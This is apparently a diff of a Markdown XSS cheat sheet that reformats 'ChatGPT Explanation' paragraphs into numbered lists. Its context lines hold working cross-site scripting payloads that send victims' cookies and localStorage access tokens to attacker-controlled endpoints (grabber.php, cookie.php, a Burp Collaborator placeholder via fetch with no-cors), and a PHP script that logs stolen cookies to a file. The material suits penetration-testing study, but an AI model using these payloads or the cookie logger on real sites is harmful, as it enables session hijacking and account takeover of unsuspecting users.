@@ -130,26 +130,41 @@ Obtains the administrator cookie or sensitive access token, the following payloa
 3. The resulting URL will look something like this: "http://localhost/XSS/grabber.php?c=session_id=abcdef; user_id=123456". 
 4. The page is then redirect to this URL which will trigger a GET request to the specified address 'http://localhost/XSS/grabber.php' and passing the cookies as a query parameter 'c'. 
 5. The script is sending all the cookies of the current website to a PHP script located on localhost, this script 'grabber.php' can be controlled by the attacker which can be used to steal the cookies and potentially gain unauthorized access to the user's account.
-
+---
 
 ```html
 <script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
 ```
 **ChatGPT Explationation:**  
-This JavaScript code uses the document.location property to redirect the current page to a new URL, which is constructed by concatenating the string 'http://localhost/XSS/grabber.php?c=' with the localStorage.getItem('access_token'). The localStorage.getItem('access_token') is a method to retrieve the value of the key 'access_token' from the local storage of the current website. The resulting URL will look something like this: "http://localhost/XSS/grabber.php?c=access_token_value". The page is then redirect to this URL which will trigger a GET request to the specified address 'http://localhost/XSS/grabber.php' and passing the access token as a query parameter 'c' . The script is sending access token from the local storage of the current website to a PHP script located on localhost, this script 'grabber.php' can be controlled by the attacker which can be used to steal the access token and potentially gain unauthorized access to the user's account or sensitive data.
+1. This JavaScript code uses the document.location property to redirect the current page to a new URL, which is constructed by concatenating the string 'http://localhost/XSS/grabber.php?c=' with the localStorage.getItem('access_token'). 
+2. The localStorage.getItem('access_token') is a method to retrieve the value of the key 'access_token' from the local storage of the current website. The resulting URL will look something like this: "http://localhost/XSS/grabber.php?c=access_token_value". 
+3. The page is then redirect to this URL which will trigger a GET request to the specified address 'http://localhost/XSS/grabber.php' and passing the access token as a query parameter 'c' . 
+4. The script is sending access token from the local storage of the current website to a PHP script located on localhost, this script 'grabber.php' can be controlled by the attacker which can be used to steal the access token and potentially gain unauthorized access to the user's account or sensitive data.
+---
 
 ```html
 <script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
 ```
 **ChatGPT Explationation:**  
-This JavaScript code creates a new Image object, and sets its src property to a URL constructed by concatenating the string 'http://localhost/cookie.php?c=' with the document.cookie property. The document.cookie property is a string containing all the cookies for the current page. The resulting URL will look something like this: "http://localhost/cookie.php?c=session_id=abcdef; user_id=123456". When the src property is set, it triggers a GET request to the specified URL, which passes the current page's cookies as a query parameter 'c'. This GET request will be sent to the server 'localhost' and the script 'cookie.php' will be executed which can be controlled by attacker. This script is used to steal the cookies of the current website and send it to an attacker-controlled server. The attacker can use these cookies to impersonate the victim and potentially gain unauthorized access to their account.
+1. This JavaScript code creates a new Image object, and sets its src property to a URL constructed by concatenating the string 'http://localhost/cookie.php?c=' with the document.cookie property. 
+2. The document.cookie property is a string containing all the cookies for the current page. The resulting URL will look something like this: "http://localhost/cookie.php?c=session_id=abcdef; user_id=123456". 
+3. When the src property is set, it triggers a GET request to the specified URL, which passes the current page's cookies as a query parameter 'c'. 
+4. This GET request will be sent to the server 'localhost' and the script 'cookie.php' will be executed which can be controlled by attacker. 
+5. This script is used to steal the cookies of the current website and send it to an attacker-controlled server. 
+6. The attacker can use these cookies to impersonate the victim and potentially gain unauthorized access to their account.
+---
 
 ```html
 <script>new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');</script>
 ```
 **ChatGPT Explationation:**  
-This JavaScript code creates a new Image object, and sets its src property to a URL constructed by concatenating the string 'http://localhost/cookie.php?c=' with the localStorage.getItem('access_token'). The localStorage.getItem('access_token') is a method to retrieve the value of the key 'access_token' from the local storage of the current website. The resulting URL will look something like this: "http://localhost/cookie.php?c=access_token_value". When the src property is set, it triggers a GET request to the specified URL, which passes the access token from the local storage as a query parameter 'c'. This GET request will be sent to the server 'localhost' and the script 'cookie.php' will be executed which can be controlled by attacker. This script is used to steal the access token from the local storage of the current website and send it to an attacker-controlled server. The attacker can use this access token to gain unauthorized access to sensitive data or user's account.
-
+1. This JavaScript code creates a new Image object, and sets its src property to a URL constructed by concatenating the string 'http://localhost/cookie.php?c=' with the localStorage.getItem('access_token'). 
+2. The localStorage.getItem('access_token') is a method to retrieve the value of the key 'access_token' from the local storage of the current website. The resulting URL will look something like this: "http://localhost/cookie.php?c=access_token_value". 
+3. When the src property is set, it triggers a GET request to the specified URL, which passes the access token from the local storage as a query parameter 'c'. 
+4. This GET request will be sent to the server 'localhost' and the script 'cookie.php' will be executed which can be controlled by attacker. 
+5. This script is used to steal the access token from the local storage of the current website and send it to an attacker-controlled server. 
+6. The attacker can use this access token to gain unauthorized access to sensitive data or user's account.
+---
 
 Write the collected data into a file.
 
@@ -162,7 +177,12 @@ fclose($fp);
 ?>
 ```
 **ChatGPT Explanation:**  
-This is a PHP script that is designed to receive a cookie value as a GET parameter named 'c', and writes it to a file called 'cookies.txt' in the same directory. When the script is executed, it first retrieves the value of the 'c' GET parameter by using the PHP built-in variable $_GET['c'], and assigns it to a variable called $cookie. Then it opens a file named 'cookies.txt' in append mode using the 'fopen' function and assigns the file pointer to a variable called $fp. Then it writes the value of the cookie to the file, by using the 'fwrite' function, along with the string 'Cookie:', so that it can be easily identified. Finally, it closes the file using the 'fclose' function. This script can be used by attacker to steal the cookies of the current website and save it to a file called 'cookies.txt' on the server, which can be used later to impersonate the victim and potentially gain unauthorized access to their account.
+1. This is a PHP script that is designed to receive a cookie value as a GET parameter named 'c', and writes it to a file called 'cookies.txt' in the same directory. 
+2. When the script is executed, it first retrieves the value of the 'c' GET parameter by using the PHP built-in variable $_GET['c'], and assigns it to a variable called $cookie. 
+4. Then it opens a file named 'cookies.txt' in append mode using the 'fopen' function and assigns the file pointer to a variable called $fp. 
+5. Then it writes the value of the cookie to the file, by using the 'fwrite' function, along with the string 'Cookie:', so that it can be easily identified. Finally, it closes the file using the 'fclose' function. 
+6. This script can be used by attacker to steal the cookies of the current website and save it to a file called 'cookies.txt' on the server, which can be used later to impersonate the victim and potentially gain unauthorized access to their account.
+---
 
 
 ### CORS
@@ -177,7 +197,11 @@ This is a PHP script that is designed to receive a cookie value as a GET paramet
 </script>
 ```
 **ChatGPT Explanation:**  
-This JavaScript code uses the fetch function to send a POST request to a specified URL (in this case, https://<SESSION>.burpcollaborator.net) with the current document's cookies as the request body. The mode: 'no-cors' option is included to bypass the same-origin policy, which would otherwise block the request. This allows the attacker to send the victim's cookies to a server under their control. If the victim is currently logged in to the website, the attacker can use the stolen cookies to impersonate the victim and potentially gain unauthorized access to their account.
+1. This JavaScript code uses the fetch function to send a POST request to a specified URL (in this case, https://<SESSION>.burpcollaborator.net) with the current document's cookies as the request body. 
+2. The mode: 'no-cors' option is included to bypass the same-origin policy, which would otherwise block the request. 
+3. This allows the attacker to send the victim's cookies to a server under their control. 
+4. If the victim is currently logged in to the website, the attacker can use the stolen cookies to impersonate the victim and potentially gain unauthorized access to their account.
+---
 
 
 ### UI redressing
